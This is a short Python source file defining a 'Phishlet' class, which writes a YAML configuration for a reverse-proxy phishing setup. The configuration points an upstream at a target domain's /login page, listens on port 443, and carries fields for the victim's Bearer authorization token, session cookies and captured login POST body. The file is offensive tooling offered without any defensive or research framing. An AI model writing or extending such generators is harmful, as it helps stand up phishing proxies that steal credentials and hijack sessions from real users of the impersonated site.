from datetime import datetime

def indent(level):
    return '  ' * level

class Phishlet(object):
    def __init__(self, domain, cookies, authorization, post_data):
        self.domain = domain
        self.cookies = cookies or []
        self.authorization = authorization
        self.post_data = post_data or ''
        self.generated_at = datetime.utcnow()

    def to_yaml(self):
        lines = []
        timestamp = self.generated_at.isoformat() + 'Z'
        lines.append("# Phishlet generated at %s" % timestamp)
        lines.append("phishlet:")
        lines.append("  name: %s" % self.domain)
        lines.append("  upstream: https://%s" % self.domain)
        lines.append("  listen: :443")
        lines.append("  locations:")
        lines.append("    login:")
        lines.append(indent(3) + "path: /login")
        lines.append(indent(3) + "endpoint: true")
        lines.append(indent(3) + "upstream: https://%s/login" % self.domain)
        lines.append(indent(3) + "auth:")
        if self.authorization:
            lines.append(indent(4) + "header: 'Authorization: Bearer %s'" % self.authorization)
        if self.cookies:
            lines.append(indent(4) + "set_cookie:")
            for c in self.cookies:
                lines.append(indent(5) + "- '%s'" % c)
        lines.append(indent(3) + "body: |")
        for line in self.post_data.splitlines():
            lines.append(indent(4) + line)
        return "\n".join(lines)
